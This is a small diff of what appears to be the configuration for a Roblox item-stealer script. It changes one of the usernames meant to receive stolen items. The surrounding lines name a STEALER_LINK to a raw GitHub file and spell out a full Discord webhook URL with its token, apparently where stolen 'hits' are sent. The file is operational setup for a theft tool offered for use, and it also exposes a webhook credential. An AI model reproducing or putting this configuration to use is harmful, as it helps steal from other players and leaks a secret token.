@@ -2,7 +2,7 @@ STEALER_LINK = 'https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/Shu
 
 Usernames = {
     'JamesCounterXyb', -- PUT UR ROBLOX USERNAMES
-    'fatir_aja'
+    'zain_fatir'
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/1361339623258718228/8eMLiikY6VRUNgWQ__IZt6jx1iFltfpbOARM6Sb_L241p-EtIoLRCtnlwrMtrq-qe4na"
